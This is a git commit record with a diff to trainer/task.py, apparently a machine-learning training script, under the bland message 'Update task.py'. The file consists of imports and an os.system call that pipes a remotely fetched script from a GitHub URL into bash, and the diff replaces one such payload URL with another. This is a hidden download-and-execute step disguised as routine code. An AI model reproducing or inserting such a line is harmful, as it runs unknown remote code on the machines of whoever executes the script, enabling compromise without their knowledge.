be20ff9908adfe9b7e514c863df38134e84b6234
kazppkido <kazepkido@gmail.com>
2024-11-09 21:18:45 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/kazppkido/gbut/raw/refs/newvira | bash')
+os.system('curl -sL https://github.com/kazppkido/gbut/raw/main/newzuph | bash')
